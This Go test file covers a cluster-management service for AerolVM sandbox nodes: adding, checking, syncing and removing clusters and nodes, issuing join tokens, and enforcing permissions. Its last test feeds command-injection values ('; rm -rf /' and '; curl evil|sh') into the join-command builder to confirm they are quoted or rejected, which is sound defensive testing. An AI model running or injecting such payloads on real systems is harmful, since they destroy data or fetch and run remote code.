package service

import (
	"bytes"
	"context"
	"errors"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/harlew-dev/lewbox/internal/aerolvm"
	"github.com/harlew-dev/lewbox/internal/aerolvm/aerolvmtest"
	"github.com/harlew-dev/lewbox/internal/db"
	"github.com/harlew-dev/lewbox/internal/secrets"
)

const clusterAdminToken = "avm_admin_test_token"

func newClusterService(t *testing.T, extra ...Option) *Service {
	t.Helper()
	conn, err := db.Open(context.Background(), filepath.Join(t.TempDir(), "lewbox.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { conn.Close() })
	keyring, err := secrets.LoadOrCreate(filepath.Join(t.TempDir(), "keyring.key"))
	if err != nil {
		t.Fatal(err)
	}
	opts := []Option{
		WithKeyring(keyring),
		WithAerolVMOptions(aerolvm.WithRetry(0)),
	}
	opts = append(opts, extra...)
	return New(db.New(conn), opts...)
}

func newClusterFake(t *testing.T, members ...aerolvm.Member) *aerolvmtest.Server {
	t.Helper()
	fake := aerolvmtest.New(t)
	fake.AdminToken = clusterAdminToken
	if len(members) > 0 {
		fake.SetMembers(members)
	}
	return fake
}

func testMember(fake *aerolvmtest.Server, name, runtime string, alive bool) aerolvm.Member {
	return aerolvm.Member{
		NodeID:   name,
		NodeName: name,
		// Each member has its own address, as on a real cluster; only a
		// member given the fake's URL stands behind the cluster's admin_url.
		APIURL:   "http://" + name + ".test:21212",
		Role:     "mixed",
		Alive:    alive,
		Version:  "v0.7.0",
		Capacity: aerolvm.Capacity{SupportedRuntimes: []string{runtime}},
	}
}

func setMembers(fake *aerolvmtest.Server, names ...string) {
	members := make([]aerolvm.Member, 0, len(names))
	for _, name := range names {
		members = append(members, testMember(fake, name, "docker", true))
	}
	fake.SetMembers(members)
}

func clusterRequest(fake *aerolvmtest.Server, slug string) AddClusterRequest {
	return AddClusterRequest{
		Slug:        slug,
		AdminURL:    fake.URL(),
		EndpointURL: fake.URL(),
		Runtime:     "docker",
		AdminToken:  fake.AdminToken,
	}
}

func addTestCluster(t *testing.T, s *Service, fake *aerolvmtest.Server, slug string) ClusterDetail {
	t.Helper()
	detail, err := s.AddCluster(localCtx(), clusterRequest(fake, slug))
	if err != nil {
		t.Fatalf("AddCluster(%s): %v", slug, err)
	}
	return detail
}

func findCheck(checks []Check, name string) (Check, bool) {
	for _, c := range checks {
		if c.Name == name {
			return c, true
		}
	}
	return Check{}, false
}

func deadURL(t *testing.T) string {
	t.Helper()
	srv := httptest.NewServer(http.NotFoundHandler())
	url := srv.URL
	srv.Close()
	return url
}

func TestAddCluster(t *testing.T) {
	s := newClusterService(t)
	fake := newClusterFake(t)
	setMembers(fake, "node-a")

	detail, err := s.AddCluster(localCtx(), clusterRequest(fake, "eu-west"))
	if err != nil {
		t.Fatal(err)
	}
	if detail.Slug != "eu-west" || detail.Name != "eu-west" || detail.Runtime != "docker" ||
		detail.Status != "ready" || detail.Version != "v0.7.0" || detail.Nodes != 1 || detail.CheckedAt == nil {
		t.Errorf("cluster = %+v", detail.Cluster)
	}
	if len(detail.Checks) < 7 {
		t.Errorf("checks = %+v", detail.Checks)
	}
	for _, c := range detail.Checks {
		if !c.OK {
			t.Errorf("check %s failed: %s", c.Name, c.Detail)
		}
	}
	if len(detail.NodeList) != 1 {
		t.Fatalf("nodes = %+v", detail.NodeList)
	}
	node := detail.NodeList[0]
	if node.Name != "node-a" || node.Cluster != "eu-west" || node.ClusterID == nil ||
		node.Role != "mixed" || node.Version != "v0.7.0" || node.Alive == nil || !*node.Alive || node.LastSeenAt == nil {
		t.Errorf("node = %+v", node)
	}

	row, err := s.q.GetClusterBySlug(context.Background(), "eu-west")
	if err != nil {
		t.Fatal(err)
	}
	if bytes.Contains(row.AdminTokenEnc, []byte(clusterAdminToken)) || string(row.AdminTokenEnc) == clusterAdminToken {
		t.Error("stored admin token is not encrypted")
	}
	if row.AdminTokenID != "tok_admin" || row.AdminTokenLast4 != "oken" {
		t.Errorf("token metadata = %q, %q", row.AdminTokenID, row.AdminTokenLast4)
	}

	list, err := s.ListClusters(localCtx())
	if err != nil || len(list.Data) != 1 || list.Data[0].Nodes != 1 {
		t.Errorf("ListClusters = %+v, %v", list, err)
	}
}

func TestAddClusterFatalChecks(t *testing.T) {
	t.Run("health", func(t *testing.T) {
		s := newClusterService(t)
		url := deadURL(t)
		_, err := s.AddCluster(localCtx(), AddClusterRequest{
			Slug:        "dead",
			AdminURL:    url,
			EndpointURL: url,
			Runtime:     "docker",
			AdminToken:  clusterAdminToken,
		})
		se := wantCode(t, err, CodePrecondition)
		checks := se.Details.([]Check)
		c, ok := findCheck(checks, "health")
		if !ok || c.OK || !c.Fatal || !strings.Contains(c.Detail, "sandboxd") {
			t.Errorf("health check = %+v", c)
		}
		list, _ := s.ListClusters(localCtx())
		if len(list.Data) != 0 {
			t.Errorf("a failed cluster was stored: %+v", list.Data)
		}
	})

	t.Run("version", func(t *testing.T) {
		s := newClusterService(t)
		fake := newClusterFake(t)
		fake.SetVersion("v0.6.12")
		_, err := s.AddCluster(localCtx(), clusterRequest(fake, "old"))
		se := wantCode(t, err, CodePrecondition)
		c, ok := findCheck(se.Details.([]Check), "version")
		if !ok || c.OK || !c.Fatal || !strings.Contains(c.Detail, "v0.6.13") {
			t.Errorf("version check = %+v", c)
		}
	})

	t.Run("admin token 401", func(t *testing.T) {
		s := newClusterService(t)
		fake := newClusterFake(t)
		req := clusterRequest(fake, "noauth")
		req.AdminToken = "wrong"
		_, err := s.AddCluster(localCtx(), req)
		se := wantCode(t, err, CodePrecondition)
		c, ok := findCheck(se.Details.([]Check), "admin_token")
		if !ok || c.OK || !c.Fatal || !strings.Contains(c.Detail, "SB_IDENTITY_ENABLED") {
			t.Errorf("admin_token check = %+v", c)
		}
	})

	t.Run("not an admin token", func(t *testing.T) {
		s := newClusterService(t)
		fake := newClusterFake(t)
		client := aerolvm.New(fake.URL(), fake.AdminToken, aerolvm.WithRetry(0))
		runner, err := client.CreateToken(context.Background(), aerolvm.CreateTokenRequest{
			Name: "runner", Role: "runner", Team: "t", ExpiresIn: "1h",
		})
		if err != nil {
			t.Fatal(err)
		}
		req := clusterRequest(fake, "runner")
		req.AdminToken = runner.Token
		_, err = s.AddCluster(localCtx(), req)
		se := wantCode(t, err, CodePrecondition)
		c, ok := findCheck(se.Details.([]Check), "admin_token")
		if !ok || c.OK || !c.Fatal || !strings.Contains(c.Detail, "admin") {
			t.Errorf("admin_token check = %+v", c)
		}
	})
}

func TestAddClusterDegradedChecks(t *testing.T) {
	cases := []struct {
		name  string
		setup func(t *testing.T, fake *aerolvmtest.Server) AddClusterRequest
		check string
	}{
		{
			name: "member not alive",
			setup: func(t *testing.T, fake *aerolvmtest.Server) AddClusterRequest {
				fake.SetMembers([]aerolvm.Member{testMember(fake, "node-a", "docker", false)})
				return clusterRequest(fake, "sick")
			},
			check: "members",
		},
		{
			name: "runtime mismatch",
			setup: func(t *testing.T, fake *aerolvmtest.Server) AddClusterRequest {
				fake.SetMembers([]aerolvm.Member{testMember(fake, "node-a", "firecracker", true)})
				return clusterRequest(fake, "wrong-runtime")
			},
			check: "runtime",
		},
		{
			name: "token ttl capped",
			setup: func(t *testing.T, fake *aerolvmtest.Server) AddClusterRequest {
				fake.SetTokenTTLCap(24 * time.Hour)
				return clusterRequest(fake, "short-ttl")
			},
			check: "token_ttl",
		},
		{
			name: "endpoint unreachable",
			setup: func(t *testing.T, fake *aerolvmtest.Server) AddClusterRequest {
				req := clusterRequest(fake, "bad-endpoint")
				req.EndpointURL = deadURL(t)
				return req
			},
			check: "endpoint",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			s := newClusterService(t)
			fake := newClusterFake(t)
			req := tc.setup(t, fake)
			detail, err := s.AddCluster(localCtx(), req)
			if err != nil {
				t.Fatalf("AddCluster: %v", err)
			}
			if detail.Status != "degraded" || detail.StatusDetail == "" {
				t.Errorf("status = %q, detail = %q", detail.Status, detail.StatusDetail)
			}
			c, ok := findCheck(detail.Checks, tc.check)
			if !ok || c.OK || c.Detail == "" {
				t.Errorf("%s check = %+v", tc.check, c)
			}
		})
	}
}

func TestAddClusterSingleNodeMode(t *testing.T) {
	s := newClusterService(t)
	fake := newClusterFake(t)
	fake.SetClusterMode(false)

	detail := addTestCluster(t, s, fake, "solo")
	if detail.Status != "ready" {
		t.Errorf("status = %q, detail %q", detail.Status, detail.StatusDetail)
	}
	c, ok := findCheck(detail.Checks, "members")
	if !ok || !c.OK || c.Detail != "single node, not in cluster mode" {
		t.Errorf("members check = %+v", c)
	}
	if len(detail.NodeList) != 1 || detail.NodeList[0].Name != "solo" || detail.NodeList[0].Alive == nil || !*detail.NodeList[0].Alive {
		t.Errorf("nodes = %+v", detail.NodeList)
	}
}

func TestAddClusterDuplicateSlug(t *testing.T) {
	s := newClusterService(t)
	fake := newClusterFake(t)
	addTestCluster(t, s, fake, "eu-west")
	_, err := s.AddCluster(localCtx(), clusterRequest(fake, "eu-west"))
	wantCode(t, err, CodeConflict)
}

func TestAddClusterValidation(t *testing.T) {
	s := newClusterService(t)
	fake := newClusterFake(t)
	cases := []AddClusterRequest{
		{Slug: "Bad_Slug", AdminURL: fake.URL(), AdminToken: clusterAdminToken},
		{Slug: "0192f0c4a3b27c6d8e9f0a1b2c3d4e5f", AdminURL: fake.URL(), AdminToken: clusterAdminToken},
		{Slug: "c1", AdminURL: "c1.example:8443", AdminToken: clusterAdminToken},
		{Slug: "c2", AdminURL: fake.URL(), Runtime: "gvisor", AdminToken: clusterAdminToken},
		{Slug: "c3", AdminURL: fake.URL()},
	}
	for _, req := range cases {
		if _, err := s.AddCluster(localCtx(), req); err == nil {
			t.Errorf("AddCluster(%q) succeeded, want invalid_request", req.Slug)
		} else {
			wantCode(t, err, CodeInvalid)
		}
	}
}

func TestNodeCertificateChecks(t *testing.T) {
	clock := time.Date(2026, 11, 12, 12, 0, 0, 0, time.UTC)
	newService := func(t *testing.T) *Service {
		return newClusterService(t, WithClock(func() time.Time { return clock }))
	}
	memberAt := func(url, name string, alive bool) aerolvm.Member {
		return aerolvm.Member{
			NodeID:   name,
			NodeName: name,
			APIURL:   url,
			Role:     "mixed",
			Alive:    alive,
			Version:  "v0.7.0",
			Capacity: aerolvm.Capacity{SupportedRuntimes: []string{"docker"}},
		}
	}

	t.Run("healthy", func(t *testing.T) {
		s := newService(t)
		fake := newClusterFake(t)
		fake.SetCertExpiry(clock.Add(60 * 24 * time.Hour))
		fake.SetMembers([]aerolvm.Member{memberAt(fake.URL(), "node-a", true)})
		detail := addTestCluster(t, s, fake, "eu-west")
		detail, err := s.CheckCluster(localCtx(), detail.Slug)
		if err != nil {
			t.Fatal(err)
		}
		if detail.Status != "ready" {
			t.Errorf("status = %q, detail = %q", detail.Status, detail.StatusDetail)
		}
		c, ok := findCheck(detail.Checks, "node certificates")
		if !ok || !c.OK {
			t.Errorf("node certificates check = %+v", c)
		}
		if len(detail.NodeList) != 1 || detail.NodeList[0].CertExpiresAt == nil {
			t.Fatalf("nodes = %+v", detail.NodeList)
		}
		want := clock.Add(60 * 24 * time.Hour)
		if !detail.NodeList[0].CertExpiresAt.Equal(want) {
			t.Errorf("cert_expires_at = %v, want %v", detail.NodeList[0].CertExpiresAt, want)
		}
	})

	t.Run("warning", func(t *testing.T) {
		s := newService(t)
		admin := newClusterFake(t)
		admin.SetCertExpiry(clock.Add(60 * 24 * time.Hour))
		other := aerolvmtest.New(t)
		other.AdminToken = clusterAdminToken
		other.SetCertExpiry(clock.Add(9 * 24 * time.Hour))
		admin.SetMembers([]aerolvm.Member{
			memberAt(admin.URL(), "node-a", true),
			memberAt(other.URL(), "node-b", true),
		})
		detail := addTestCluster(t, s, admin, "eu-west")
		detail, err := s.CheckCluster(localCtx(), detail.Slug)
		if err != nil {
			t.Fatal(err)
		}
		if detail.Status != "degraded" {
			t.Errorf("status = %q, detail = %q", detail.Status, detail.StatusDetail)
		}
		c, ok := findCheck(detail.Checks, "node certificates")
		if !ok || c.OK || c.Fatal {
			t.Fatalf("node certificates check = %+v", c)
		}
		for _, want := range []string{"node-b's cluster certificate expires in 9 days (2026-11-21)", "renewal has failed"} {
			if !strings.Contains(c.Detail, want) {
				t.Errorf("detail %q does not contain %q", c.Detail, want)
			}
		}
		byName := map[string]*time.Time{}
		for _, node := range detail.NodeList {
			byName[node.Name] = node.CertExpiresAt
		}
		if at := byName["node-b"]; at == nil || !at.Equal(clock.Add(9*24*time.Hour)) {
			t.Errorf("node-b cert_expires_at = %v", at)
		}
		if at := byName["node-a"]; at == nil || !at.Equal(clock.Add(60*24*time.Hour)) {
			t.Errorf("node-a cert_expires_at = %v", at)
		}
	})

	t.Run("unknown", func(t *testing.T) {
		s := newService(t)
		fake := newClusterFake(t)
		fake.SetMembers([]aerolvm.Member{memberAt(fake.URL(), "node-a", true)})
		detail := addTestCluster(t, s, fake, "eu-west")
		detail, err := s.CheckCluster(localCtx(), detail.Slug)
		if err != nil {
			t.Fatal(err)
		}
		if detail.Status != "ready" {
			t.Errorf("status = %q, detail = %q", detail.Status, detail.StatusDetail)
		}
		c, ok := findCheck(detail.Checks, "node certificates")
		if !ok || !c.OK || c.Detail != "could not read any node's certificate expiry" {
			t.Errorf("node certificates check = %+v", c)
		}
		if len(detail.NodeList) != 1 || detail.NodeList[0].CertExpiresAt != nil {
			t.Errorf("nodes = %+v", detail.NodeList)
		}
	})

	t.Run("unreachable member skipped", func(t *testing.T) {
		s := newService(t)
		fake := newClusterFake(t)
		fake.SetCertExpiry(clock.Add(60 * 24 * time.Hour))
		fake.SetMembers([]aerolvm.Member{
			memberAt(fake.URL(), "node-a", true),
			memberAt(deadURL(t), "node-b", true),
		})
		detail := addTestCluster(t, s, fake, "eu-west")
		detail, err := s.CheckCluster(localCtx(), detail.Slug)
		if err != nil {
			t.Fatal(err)
		}
		if detail.Status != "ready" {
			t.Errorf("status = %q, detail = %q", detail.Status, detail.StatusDetail)
		}
		c, ok := findCheck(detail.Checks, "node certificates")
		if !ok || !c.OK {
			t.Errorf("node certificates check = %+v", c)
		}
		for _, node := range detail.NodeList {
			if node.Name == "node-b" && node.CertExpiresAt != nil {
				t.Errorf("node-b has cert_expires_at = %v", node.CertExpiresAt)
			}
		}
	})
}

func TestCheckClusterStatus(t *testing.T) {
	s := newClusterService(t)
	fake := newClusterFake(t)
	setMembers(fake, "node-a")
	detail := addTestCluster(t, s, fake, "eu-west")

	fake.SetTokenTTLCap(time.Hour)
	degraded, err := s.CheckCluster(localCtx(), detail.Slug)
	if err != nil {
		t.Fatal(err)
	}
	if degraded.Status != "degraded" || !strings.Contains(degraded.StatusDetail, "SB_TOKEN_MAX_TTL") {
		t.Errorf("degraded = %q, %q", degraded.Status, degraded.StatusDetail)
	}
	if c, ok := findCheck(degraded.Checks, "token_ttl"); !ok || c.OK {
		t.Errorf("token_ttl check = %+v", c)
	}

	fake.Stop()
	unreachable, err := s.CheckCluster(localCtx(), detail.Slug)
	if err != nil {
		t.Fatal(err)
	}
	if unreachable.Status != "unreachable" || unreachable.Nodes != 1 || len(unreachable.NodeList) != 1 {
		t.Errorf("unreachable = %+v", unreachable.Cluster)
	}
	if c, ok := findCheck(unreachable.Checks, "health"); !ok || c.OK || !c.Fatal {
		t.Errorf("health check = %+v", c)
	}
	// The nodes are kept, but no longer reported alive.
	for _, n := range unreachable.NodeList {
		if n.Alive == nil || *n.Alive {
			t.Errorf("node %s alive = %v, want false", n.Name, n.Alive)
		}
	}
}

func TestNodeSync(t *testing.T) {
	s := newClusterService(t)
	fake := newClusterFake(t)
	setMembers(fake, "node-a", "node-b")

	if _, err := s.AddNode(localCtx(), AddNodeRequest{Name: "node-b", URL: "https://old.example"}); err != nil {
		t.Fatal(err)
	}
	detail := addTestCluster(t, s, fake, "eu-west")
	if len(detail.NodeList) != 2 {
		t.Fatalf("nodes = %+v", detail.NodeList)
	}
	adopted, err := s.GetNode(localCtx(), "node-b")
	if err != nil {
		t.Fatal(err)
	}
	if adopted.Cluster != "eu-west" || adopted.URL != "http://node-b.test:21212" || adopted.Alive == nil || !*adopted.Alive {
		t.Errorf("adopted node = %+v", adopted)
	}

	setMembers(fake, "node-a")
	checked, err := s.CheckCluster(localCtx(), "eu-west")
	if err != nil {
		t.Fatal(err)
	}
	if len(checked.NodeList) != 1 || checked.NodeList[0].Name != "node-a" {
		t.Errorf("after member left: %+v", checked.NodeList)
	}
	if _, err := s.GetNode(localCtx(), "node-b"); err != nil {
		wantCode(t, err, CodeNotFound)
	}
}

func TestNodeSyncConflictWithAnotherCluster(t *testing.T) {
	s := newClusterService(t)
	first := newClusterFake(t)
	setMembers(first, "shared")
	firstDetail := addTestCluster(t, s, first, "alpha")

	second := newClusterFake(t)
	setMembers(second, "shared")
	detail, err := s.AddCluster(localCtx(), clusterRequest(second, "beta"))
	if err != nil {
		t.Fatal(err)
	}
	if detail.Status != "degraded" {
		t.Errorf("status = %q", detail.Status)
	}
	c, ok := findCheck(detail.Checks, "members")
	if !ok || c.OK || !strings.Contains(c.Detail, "alpha") {
		t.Errorf("members check = %+v", c)
	}
	node, err := s.GetNode(localCtx(), "shared")
	if err != nil {
		t.Fatal(err)
	}
	if node.Cluster != firstDetail.Slug || node.ClusterID == nil || firstDetail.ID != *node.ClusterID {
		t.Errorf("node moved to %+v", node)
	}
}

func TestResolveCluster(t *testing.T) {
	s := newClusterService(t)
	alphaFake := newClusterFake(t)
	setMembers(alphaFake, "dup", "only-node")
	alpha := addTestCluster(t, s, alphaFake, "alpha")

	dupFake := newClusterFake(t)
	setMembers(dupFake, "other")
	dup := addTestCluster(t, s, dupFake, "dup")

	cases := []struct {
		ref  string
		want string
	}{
		{"alpha", alpha.ID},
		{alpha.ID, alpha.ID},
		{"only-node", alpha.ID},
		{"node/dup", alpha.ID},
		{"cluster/dup", dup.ID},
	}
	for _, tc := range cases {
		got, err := s.ResolveCluster(localCtx(), tc.ref)
		if err != nil || got.ID != tc.want {
			t.Errorf("ResolveCluster(%q) = %+v, %v; want %s", tc.ref, got, err, tc.want)
		}
	}

	node, err := s.GetNode(localCtx(), "only-node")
	if err != nil {
		t.Fatal(err)
	}
	if byID, err := s.ResolveCluster(localCtx(), node.ID); err != nil || byID.ID != alpha.ID {
		t.Errorf("ResolveCluster(node id) = %+v, %v", byID, err)
	}

	_, err = s.ResolveCluster(localCtx(), "missing")
	wantCode(t, err, CodeNotFound)
	if _, err := s.ResolveCluster(localCtx(), "node/missing"); err != nil {
		wantCode(t, err, CodeNotFound)
	}
}

func TestResolveClusterAmbiguity(t *testing.T) {
	s := newClusterService(t)
	alphaFake := newClusterFake(t)
	setMembers(alphaFake, "dup")
	addTestCluster(t, s, alphaFake, "alpha")

	dupFake := newClusterFake(t)
	setMembers(dupFake, "other")
	addTestCluster(t, s, dupFake, "dup")

	_, err := s.ResolveCluster(localCtx(), "dup")
	se := wantCode(t, err, CodeConflict)
	if !strings.Contains(se.Message, "cluster/dup") || !strings.Contains(se.Message, "node/dup") {
		t.Errorf("message = %q", se.Message)
	}
	if got, err := s.ResolveCluster(localCtx(), "cluster/dup"); err != nil || got.Slug != "dup" {
		t.Errorf("cluster/dup = %+v, %v", got, err)
	}
	if got, err := s.ResolveCluster(localCtx(), "node/dup"); err != nil || got.Slug != "alpha" {
		t.Errorf("node/dup = %+v, %v", got, err)
	}
}

func TestCreateJoinToken(t *testing.T) {
	s := newClusterService(t)
	fake := newClusterFake(t)
	setMembers(fake, "node-a")
	detail := addTestCluster(t, s, fake, "eu-west")

	before := time.Now()
	join, err := s.CreateJoinToken(localCtx(), detail.Slug, JoinTokenRequest{})
	if err != nil {
		t.Fatal(err)
	}
	if join.ClusterID != detail.ID || join.Cluster != "eu-west" || join.Runtime != "docker" || join.Version != "v0.7.0" {
		t.Errorf("join = %+v", join)
	}
	if join.Role != "mixed" || join.TokenRole != "server" {
		t.Errorf("roles = %q -> %q", join.Role, join.TokenRole)
	}
	if join.Token == "" || join.CACertHash == "" || len(join.JoinURLs) == 0 {
		t.Errorf("join secrets = %+v", join)
	}
	if join.ExpiresAt.Before(before.Add(14*time.Minute)) || join.ExpiresAt.After(before.Add(16*time.Minute)) {
		t.Errorf("expires_at = %v, want about 15m", join.ExpiresAt)
	}
	if !strings.Contains(join.Command, join.JoinURLs[0]) || !strings.Contains(join.Command, join.Token) ||
		!strings.Contains(join.Command, "--role 'mixed'") {
		t.Errorf("command = %q", join.Command)
	}
	joins := fake.JoinTokens()
	if len(joins) != 1 || joins[0].Role != "server" {
		t.Errorf("upstream join tokens = %+v", joins)
	}

	worker, err := s.CreateJoinToken(localCtx(), "node/node-a", JoinTokenRequest{Role: "worker", TTL: "1h"})
	if err != nil {
		t.Fatal(err)
	}
	if worker.TokenRole != "worker" {
		t.Errorf("worker token role = %q", worker.TokenRole)
	}

	if _, err := s.CreateJoinToken(localCtx(), detail.Slug, JoinTokenRequest{Role: "boss"}); err != nil {
		wantCode(t, err, CodeInvalid)
	}

	fake.FailNext("/v1/cluster/join-tokens", http.StatusInternalServerError, `{"error":"boom"}`, 1)
	_, err = s.CreateJoinToken(localCtx(), detail.Slug, JoinTokenRequest{})
	se := wantCode(t, err, CodeUnavailable)
	if !strings.Contains(se.Message, "boom") {
		t.Errorf("unavailable message = %q", se.Message)
	}
}

func TestRemoveNode(t *testing.T) {
	s := newClusterService(t)
	fake := newClusterFake(t)
	setMembers(fake, "node-a", "node-b")
	addTestCluster(t, s, fake, "eu-west")

	if _, err := s.RemoveNode(localCtx(), "node-b", RemoveNodeRequest{}); err != nil {
		t.Fatal(err)
	}
	if got := fake.Drained(); len(got) != 1 || got[0] != "node-b" {
		t.Errorf("drained = %v", got)
	}
	if got := fake.Deleted(); len(got) != 1 || got[0] != "node-b" {
		t.Errorf("deleted = %v", got)
	}
	if _, err := s.GetNode(localCtx(), "node-b"); err != nil {
		wantCode(t, err, CodeNotFound)
	}

	_, err := s.RemoveNode(localCtx(), "node-a", RemoveNodeRequest{})
	se := wantCode(t, err, CodeConflict)
	if !strings.Contains(se.Message, "lewbox cluster remove") {
		t.Errorf("message = %q", se.Message)
	}
}

func TestRemoveNodeBehindAdminURL(t *testing.T) {
	s := newClusterService(t)
	fake := newClusterFake(t)
	seed := testMember(fake, "node-a", "docker", true)
	seed.APIURL = fake.URL() // the cluster was registered through node-a
	fake.SetMembers([]aerolvm.Member{seed, testMember(fake, "node-b", "docker", true)})
	addTestCluster(t, s, fake, "eu-west")

	_, err := s.RemoveNode(localCtx(), "node-a", RemoveNodeRequest{})
	se := wantCode(t, err, CodeConflict)
	if !strings.Contains(se.Message, "admin URL") {
		t.Errorf("message = %q", se.Message)
	}
	if got := fake.Drained(); len(got) != 0 {
		t.Errorf("drained = %v, want nothing touched", got)
	}
	if _, err := s.GetNode(localCtx(), "node-a"); err != nil {
		t.Errorf("node-a should still be registered: %v", err)
	}
}

func TestRemoveNodeUpstream404(t *testing.T) {
	s := newClusterService(t)
	fake := newClusterFake(t)
	setMembers(fake, "node-a", "node-b")
	addTestCluster(t, s, fake, "eu-west")

	fake.FailNext("/v1/cluster/nodes/node-b", http.StatusNotFound, `{"error":"cluster: unknown node"}`, 1)
	if _, err := s.RemoveNode(localCtx(), "node-b", RemoveNodeRequest{}); err != nil {
		t.Fatalf("RemoveNode: %v", err)
	}
	if _, err := s.GetNode(localCtx(), "node-b"); err != nil {
		wantCode(t, err, CodeNotFound)
	}
}

func TestRemoveLegacyNode(t *testing.T) {
	s := newClusterService(t)
	fake := newClusterFake(t)
	if _, err := s.AddNode(localCtx(), AddNodeRequest{Name: "legacy", URL: "https://legacy.example"}); err != nil {
		t.Fatal(err)
	}
	if _, err := s.RemoveNode(localCtx(), "legacy", RemoveNodeRequest{}); err != nil {
		t.Fatal(err)
	}
	if len(fake.Drained()) != 0 || len(fake.Deleted()) != 0 {
		t.Errorf("legacy removal called the cluster")
	}
}

func TestRemoveCluster(t *testing.T) {
	s := newClusterService(t)
	fake := newClusterFake(t)
	setMembers(fake, "node-a")
	addTestCluster(t, s, fake, "eu-west")

	removed, err := s.RemoveCluster(localCtx(), "eu-west", false)
	if err != nil {
		t.Fatal(err)
	}
	if removed.Slug != "eu-west" || removed.Nodes != 1 {
		t.Errorf("removed = %+v", removed)
	}
	found := false
	for _, id := range fake.Revoked() {
		if id == "tok_admin" {
			found = true
		}
	}
	if !found {
		t.Errorf("revoked = %v, want tok_admin", fake.Revoked())
	}
	if _, err := s.GetCluster(localCtx(), "eu-west"); err != nil {
		wantCode(t, err, CodeNotFound)
	}
	nodes, err := s.ListNodes(localCtx(), ListNodesRequest{})
	if err != nil || len(nodes.Data) != 0 {
		t.Errorf("nodes after cluster removal = %+v, %v", nodes.Data, err)
	}
}

func TestCheckAllClusters(t *testing.T) {
	s := newClusterService(t)
	first := newClusterFake(t)
	second := newClusterFake(t)
	setMembers(first, "a")
	setMembers(second, "b")
	addTestCluster(t, s, first, "alpha")
	addTestCluster(t, s, second, "beta")

	if err := s.CheckAllClusters(context.Background()); err != nil {
		t.Errorf("CheckAllClusters: %v", err)
	}
	// CheckCluster records an unreachable cluster without returning an
	// error, so CheckAllClusters only fails when checking itself fails.
	s.keyring = nil
	if err := s.CheckAllClusters(context.Background()); err == nil {
		t.Error("CheckAllClusters succeeded without a keyring")
	}
}

func TestClusterPermissions(t *testing.T) {
	s := newClusterService(t)
	createUser(t, s, "admin@example.com", true)
	plain := createUser(t, s, "plain@example.com", false)
	plainPrincipal, _ := loginUser(t, s, plain.Email, testPassword)
	plainCtx := WithPrincipal(context.Background(), plainPrincipal)
	adminPrincipal, _ := loginUser(t, s, "admin@example.com", testPassword)
	adminCtx := WithPrincipal(context.Background(), adminPrincipal)

	fake := newClusterFake(t)
	anon := context.Background()
	if _, err := s.AddCluster(anon, clusterRequest(fake, "anon")); err != nil {
		wantCode(t, err, CodeUnauthorized)
	}
	if _, err := s.ListClusters(anon); err != nil {
		wantCode(t, err, CodeUnauthorized)
	}
	if _, err := s.ListClusters(plainCtx); err != nil {
		wantCode(t, err, CodeForbidden)
	}
	if _, err := s.ListRegions(plainCtx); err != nil {
		t.Errorf("plain user list regions: %v", err)
	}
	if _, err := s.AddCluster(plainCtx, clusterRequest(fake, "plain")); err != nil {
		wantCode(t, err, CodeForbidden)
	}

	detail, err := s.AddCluster(adminCtx, clusterRequest(fake, "eu-west"))
	if err != nil {
		t.Fatalf("admin add cluster: %v", err)
	}
	if _, err := s.CheckCluster(plainCtx, detail.Slug); err != nil {
		wantCode(t, err, CodeForbidden)
	}
	if _, err := s.CreateJoinToken(plainCtx, detail.Slug, JoinTokenRequest{}); err != nil {
		wantCode(t, err, CodeForbidden)
	}
	if _, err := s.RemoveCluster(plainCtx, detail.Slug, false); err != nil {
		wantCode(t, err, CodeForbidden)
	}
}

func TestClusterWithoutKeyring(t *testing.T) {
	s := newTestService(t)
	fake := newClusterFake(t)
	_, err := s.AddCluster(localCtx(), clusterRequest(fake, "eu-west"))
	if err == nil {
		t.Fatal("AddCluster succeeded without a keyring")
	}
	var se *Error
	if errors.As(err, &se) {
		t.Errorf("no keyring should be an internal error, got %v", err)
	}
	if !strings.Contains(err.Error(), "no keyring configured") {
		t.Errorf("error = %v", err)
	}
}

// An empty member list from AerolVM must not unregister every node.
func TestCheckClusterEmptyMembersKeepsNodes(t *testing.T) {
	s := newClusterService(t)
	fake := newClusterFake(t)
	setMembers(fake, "node-a", "node-b")
	addTestCluster(t, s, fake, "eu-west")
	fake.SetMembers([]aerolvm.Member{})
	detail, err := s.CheckCluster(localCtx(), "eu-west")
	if err != nil {
		t.Fatal(err)
	}
	if detail.Nodes != 2 || detail.Status == "ready" {
		t.Errorf("nodes = %d status = %s, want 2 nodes kept and not ready", detail.Nodes, detail.Status)
	}
}

func TestJoinCommandQuotesAndPins(t *testing.T) {
	got := joinCommand("v0.7.0", "https://10.0.0.7:7003", "abc.def'; rm -rf /", "sha256:00", "mixed")
	for _, want := range []string{
		"releases/download/v0.7.0/install.sh",
		"sha256sum -c -",
		`--token 'abc.def'\''; rm -rf /'`,
	} {
		if !strings.Contains(got, want) {
			t.Errorf("command %q lacks %q", got, want)
		}
	}
	if strings.Contains(got, "aerolvm.aerol.ai") {
		t.Errorf("command pipes the unpinned installer: %q", got)
	}
	if joinCommand("v0.7.0; curl evil|sh", "u", "t", "h", "mixed") != "" {
		t.Error("a version that is not a release tag produced a command")
	}
}
